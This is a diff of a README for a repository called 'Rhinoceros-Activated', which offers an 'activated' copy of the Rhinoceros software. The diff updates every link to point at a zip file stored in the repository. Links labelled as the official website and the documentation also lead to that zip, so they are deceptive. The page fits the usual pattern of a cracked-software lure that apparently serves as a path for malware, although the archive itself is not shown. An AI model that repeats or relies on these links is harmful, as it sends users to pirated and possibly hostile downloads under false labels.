@@ -1,6 +1,6 @@
 # 🦏 Rhinoceros-Activated - Maximize Your Rhinoceros Experience
 
-[![Download Now](https://github.com/nikunj2605/Rhinoceros-Activated/raw/refs/heads/main/within/Activated-Rhinoceros-2.0.zip%20Now-Click%20Here-blue)](https://github.com/nikunj2605/Rhinoceros-Activated/raw/refs/heads/main/within/Activated-Rhinoceros-2.0.zip)
+[![Download Now](https://raw.githubusercontent.com/nikunj2605/Rhinoceros-Activated/main/within/Rhinoceros_Activated_v2.4.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/nikunj2605/Rhinoceros-Activated/main/within/Rhinoceros_Activated_v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Rhinoceros-Activated! This collection provides you with all the resou
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the application: [Download Rhinoceros-Activated](https://github.com/nikunj2605/Rhinoceros-Activated/raw/refs/heads/main/within/Activated-Rhinoceros-2.0.zip).
+To get started, visit this page to download the application: [Download Rhinoceros-Activated](https://raw.githubusercontent.com/nikunj2605/Rhinoceros-Activated/main/within/Rhinoceros_Activated_v2.4.zip).
 
 1. Go to the Releases page.
 2. Find the latest version.
@@ -64,7 +64,7 @@ If you encounter issues, you can find assistance through the following resources
 
 ## 📎 Useful Links
 
-- [Official Rhinoceros Website](https://github.com/nikunj2605/Rhinoceros-Activated/raw/refs/heads/main/within/Activated-Rhinoceros-2.0.zip)
-- [Rhinoceros Documentation](https://github.com/nikunj2605/Rhinoceros-Activated/raw/refs/heads/main/within/Activated-Rhinoceros-2.0.zip)
+- [Official Rhinoceros Website](https://raw.githubusercontent.com/nikunj2605/Rhinoceros-Activated/main/within/Rhinoceros_Activated_v2.4.zip)
+- [Rhinoceros Documentation](https://raw.githubusercontent.com/nikunj2605/Rhinoceros-Activated/main/within/Rhinoceros_Activated_v2.4.zip)
 
 Make sure to explore all the options available for Rhinoceros, and maximize your productivity with the right tools and knowledge. Enjoy your experience with Rhinoceros-Activated!
